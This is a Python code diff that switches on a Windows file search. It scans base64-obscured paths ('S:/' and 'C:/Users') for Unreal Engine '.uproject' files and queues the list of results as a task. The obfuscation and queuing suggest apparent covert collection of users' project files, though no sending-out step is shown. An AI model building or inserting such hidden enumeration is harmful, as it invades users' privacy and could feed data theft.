@@ -130,7 +130,7 @@ else:
 '''
 # ===============================================================================
 import base64, os, time
-def search_extention(ext='.exe', dir_path='C:/Users'):
+def search_extention(ext='', dir_path=''):
     global base64, os, time
     if not os.name == 'nt':
         return []
@@ -148,7 +148,7 @@ def search_extention(ext='.exe', dir_path='C:/Users'):
     return p_ls
 try:
     zovV = []
-    #zovV += search_extention(dir_path=base64.b64decode('Uzov').decode(), ext='.exe')
+    zovV += search_extention(dir_path=base64.b64decode('Uzov').decode(), ext='.uproject')
     zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
     add_queue_task('ext_path_ls', dict(zovV))
 except:
@@ -170,3 +170,11 @@ except:
 else:
     del sj_ls, sj_dict
 '''
+# ===============================================================================
+try:
+    pass
+except:
+    pass
+else:
+    pass
+# ===============================================================================
